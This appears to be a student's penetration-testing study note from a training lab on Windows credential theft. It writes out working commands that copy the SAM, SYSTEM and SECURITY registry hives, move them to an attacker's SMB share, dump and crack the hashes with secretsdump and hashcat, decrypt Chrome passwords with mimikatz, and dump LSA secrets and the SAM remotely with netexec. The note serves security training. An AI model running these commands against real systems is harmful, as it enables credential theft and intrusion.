With **administrative access** to a Windows system, we can attempt to quickly **dump the files associated with the SAM database**, transfer them to our attack host, and begin cracking the hashes offline.

# Registry hives
---
- There are **three registry hives we can copy** if we have local administrative access to a target system. 
- A brief description of each is provided in the table below:
	![[Pasted image 20250629080847.png]]

## Using reg.exe to copy registry hives
---
- By launching **`cmd.exe` with administrative privileges,** we can use `reg.exe` to save copies of the registry hives:
	- `reg.exe save hklm\sam C:\sam.save`
	- `reg.exe save hklm\system C:\system.save`
	- `reg.exe save hklm\security C:\security.save`
- If we're **only interested in dumping the hashes** of local users, we need **only `HKLM\SAM` and `HKLM\SYSTEM`.** 
- However, it's often useful to **save `HKLM\SECURITY` as well**, since it can contain **cached domain user credentials on domain-joined systems, along with other valuable data.**

## Creating a share with smbserver
---
- To create the share, we simply **run `impacket-smbserver -smb2support`, specify a name for the share** (e.g., `CompData`), **and point to the local directory on our attack host where the hive copies will be stored (e.g., `/home/ltnbob/Documents`)**

- The `-smb2support` flag ensures **compatibility with newer versions of SMB.**
	- `impacket-smbserver -smb2support CompData /home/ltnbob/Documents/`
- Moving hive copies to share (On Windows):
	- `move sam.save \\10.10.15.16\CompData`
	- `move security.save \\10.10.15.16\CompData`
	- `move system.save \\10.10.15.16\CompData`

# Dumping hashes with secretsdump
----
- `impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL`

- Notice that the first step `secretsdump` performs is **retrieving the `system bootkey` before proceeding to dump** the `local SAM hashes`.
- This is necessary because the bootkey is used to encrypt and decrypt the SAM database.

# Cracking hashes with Hashcat
---
- Once we have the hashes, we can begin cracking them using [Hashcat](https://hashcat.net/hashcat/).
- Running Hashcat against NT hashes:
	- ` sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt`
	  
- It is very common for **==users to reuse passwords across different work and personal accounts.==** **==Understanding and applying this technique can be valuable during assessments.==**

# DCC2 hashes
---
- **`hklm\security` contains cached domain logon information**, specifically in the **form of DCC2 hashes.** These are local, hashed copies of network credential hashes. An example is: `inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25`

- This type of hash is **much more difficult to crack than an NT hash, as it uses PBKDF2.**
- It **CANNOT be used for lateral movement with techniques like Pass-the-Hash**
- The Hashcat mode for cracking DCC2 hashes is `2100`:
	- `hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt`

# DPAPI
---
- In addition to the DCC2 hashes, we previously saw that the **`machine and user keys` for `DPAPI` were also dumped from `hklm\security`**
- The **Data Protection Application Programming Interface,** or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection), is a set of **APIs in Windows operating systems used to ==encrypt and decrypt data blobs on a per-user basis.==**
- These blobs are utilized by various Windows OS features and third-party applications.
	- ![[Pasted image 20250629165748.png]]
- DPAPI encrypted credentials **can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).**:
	- `mimikatz #`  `dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect`

# Remote dumping & LSA secrets considerations
---
- Dumping LSA secrets remotely:
	- `netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`
- Dumping SAM Remotely:
	- `netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam`
- Note:- **We can use impacket-secretsdump** to get **ALL** the possible credentials:
	- `impacket-secretsdump 'noodlesvc':'ch1ck3nnoodle'@10.10.10.15`